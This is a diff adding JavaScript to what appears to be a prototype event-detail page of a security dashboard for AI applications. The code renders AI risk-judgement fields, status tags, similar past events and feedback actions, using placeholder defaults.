+    function getAiProfile(profile) {
+      var lowConfidence = Number(profile.confidence || 0) < 0.6;
+      var base = {
+        detectionSource: profile.aiDetectionSource || (lowConfidence ? 'rule' : 'rule_and_ai'),
+        detectionSourceLabel: profile.aiDetectionSourceLabel || (lowConfidence ? '规则检出' : '规则+AI联合检出'),
+        aiStatus: profile.aiStatus || (lowConfidence ? 'skipped_by_policy' : 'success'),
+        aiStatusLabel: profile.aiStatusLabel || (lowConfidence ? '策略跳过AI检测' : 'AI检测成功'),
+        analysisStatus: profile.aiAnalysisStatus || (lowConfidence ? 'rejected' : 'generated'),
+        analysisStatusLabel: profile.aiAnalysisStatusLabel || (lowConfidence ? '已拒绝' : 'AI研判已生成'),
+        confidenceLevel: profile.aiConfidenceLevel || (lowConfidence ? 'low' : 'high'),
+        confidenceLevelLabel: profile.aiConfidenceLevelLabel || (lowConfidence ? '低' : '高'),
+        attackMethod: profile.aiAttackMethod || profile.riskType,
+        impact: profile.aiImpact || '可能影响 ' + profile.app + ' 的安全边界，需要结合证据确认是否扩大到应用或工具级处置。',
+        priority: profile.aiPriority || (profile.riskLevel === '高风险' ? 'high' : 'medium'),
+        modelVersion: profile.aiModelVersion || 'sec-judge-v1.2',
+        promptVersion: profile.aiPromptVersion || 'judge-prompt-v0.8',
+        latencyMs: profile.aiLatencyMs || 1840,
+        tokens: profile.aiTokens || 1286,
+        cost: profile.aiCost || '0.018',
+        riskTags: profile.aiRiskTags || [profile.riskType, profile.riskStage],
+        hitFragments: profile.aiHitFragments || [{ field: profile.source, text: profile.finding, offset: profile.offset }],
+        reasons: profile.aiReasons || [
+          '证据字段与当前风险阶段匹配，且命中内容与规则解释一致。',
+          '事件涉及的应用、工具或资源与安全边界配置存在差异。',
+          '当前结论仍需人工结合业务上下文确认。'
+        ],
+        counterExamples: profile.aiCounterExamples || [
+          '如果该工具调用已在临时审批范围内，可能应降级为告警。',
+          '如果命中内容来自测试或演练数据，可能进入误报样本。'
+        ],
+        missingEvidence: profile.aiMissingEvidence || ['缺少业务负责人对本次操作意图的确认。'],
+        openQuestions: profile.aiOpenQuestions || ['该调用是否属于已批准的临时任务？'],
+        similarEvents: profile.similarEvents || [
+          { id: 'EVT-2026-00007', score: '0.86', points: '相同风险阶段、相同应用类型、相似工具调用', result: '限制 Tool 6 小时后关闭' },
+          { id: 'EVT-2026-00003', score: '0.82', points: '相同检测器、相似证据字段', result: '人工确认为边界样本' }
+        ]
+      };
+      return base;
+    }
+
+    function tagClassForStatus(status) {
+      if (['success', 'generated', 'confirmed', 'modified'].indexOf(status) >= 0) return 'tag-success';
+      if (['pending', 'skipped', 'skipped_by_policy', 'rejected'].indexOf(status) >= 0) return 'tag-warning';
+      if (['timeout', 'error', 'circuit_open'].indexOf(status) >= 0) return 'tag-danger';
+      return 'tag-info';
+    }
+
+    function renderAiStatusTags(ai) {
+      document.getElementById('detectionSourceTag').textContent = ai.detectionSourceLabel;
+      document.getElementById('detectionSourceTag').className = 'tag ' + (ai.detectionSource === 'rule_and_ai' ? 'tag-primary' : 'tag-info');
+      document.getElementById('aiStatusTag').textContent = ai.aiStatusLabel;
+      document.getElementById('aiStatusTag').className = 'tag ' + tagClassForStatus(ai.aiStatus);
+      document.getElementById('aiAnalysisStatusTag').textContent = ai.analysisStatusLabel;
+      document.getElementById('aiAnalysisStatusTag').className = 'tag ' + tagClassForStatus(ai.analysisStatus);
+      document.getElementById('confidenceReviewTag').style.display = ai.confidenceLevel === 'low' ? 'inline-flex' : 'none';
+    }
+
+    function renderAiJudgement(ai) {
+      document.getElementById('aiJudgementBadge').textContent = ai.analysisStatus;
+      document.getElementById('aiJudgementBadge').className = 'tag ' + tagClassForStatus(ai.analysisStatus);
+      document.getElementById('aiAttackMethod').textContent = ai.attackMethod;
+      document.getElementById('aiJudgementConfidence').textContent = ai.confidenceLevelLabel;
+      document.getElementById('aiPriority').textContent = ai.priority;
+      document.getElementById('aiModelVersion').textContent = ai.modelVersion;
+      document.getElementById('aiPromptVersion').textContent = ai.promptVersion;
+      document.getElementById('aiImpact').textContent = ai.impact;
+      document.getElementById('aiReasons').innerHTML = ai.reasons.map(function(item) { return '<li>' + item + '</li>'; }).join('');
+      document.getElementById('aiMissingEvidence').innerHTML = ai.missingEvidence.map(function(item) { return '<li>' + item + '</li>'; }).join('');
+      document.getElementById('aiOpenQuestions').innerHTML = ai.openQuestions.map(function(item) { return '<li>' + item + '</li>'; }).join('');
+      document.getElementById('aiFeedbackAttack').value = ai.attackMethod;
+    }
+
+    function renderSimilarEvents(ai) {
+      document.getElementById('similarEventsBody').innerHTML = ai.similarEvents.map(function(item) {
+        return '<div class="similar-event">' +
+          '<div class="similar-event-title"><span class="mono">' + item.id + '</span><span class="tag tag-primary">' + item.score + '</span></div>' +
+          '<div class="similar-event-meta">关键相似点：' + item.points + '<br>历史处置：' + item.result + '</div>' +
+          '</div>';
+      }).join('') + '<div class="form-hint" style="margin-top:8px;">相似事件仅供参考，不自动继承历史处置结论。</div>';
+    }
+
+    function submitAiFeedback(status) {
+      var messages = { confirmed: 'AI研判已确认，反馈将进入样本候选集', rejected: 'AI研判已拒绝，拒绝原因将写入审计' };
+      toastSuccess(messages[status] || 'AI研判反馈已提交');
+    }
+
+    function submitAiCorrection() {
+      if (validateForm('aiFeedbackForm')) {
+        toastSuccess('AI研判修正已提交，样本候选集已更新');
+        closeModal('aiFeedbackModal');
+      }
+    }
+
+    function backToList() {
+      navigateTo('pages/events/event-list.html', '风险事件', 'event-list.html');
+    }
+
+    function goTrace() {
+      var url = 'pages/monitor/trace-list.html?trace_id=' + encodeURIComponent(currentEvent.traceId) + '&span_id=' + encodeURIComponent(currentEvent.spanId);
+      navigateTo(url, '风险溯源', '../monitor/trace-list.html?trace_id=' + encodeURIComponent(currentEvent.traceId) + '&span_id=' + encodeURIComponent(currentEvent.spanId));
+    }
+
+    function submitModal(formId, modalId, message) {
+      if (validateForm(formId)) {
+        toastSuccess(message);
+        closeModal(modalId);
+      }
+    }
+  </script>
+</body>
+</html>
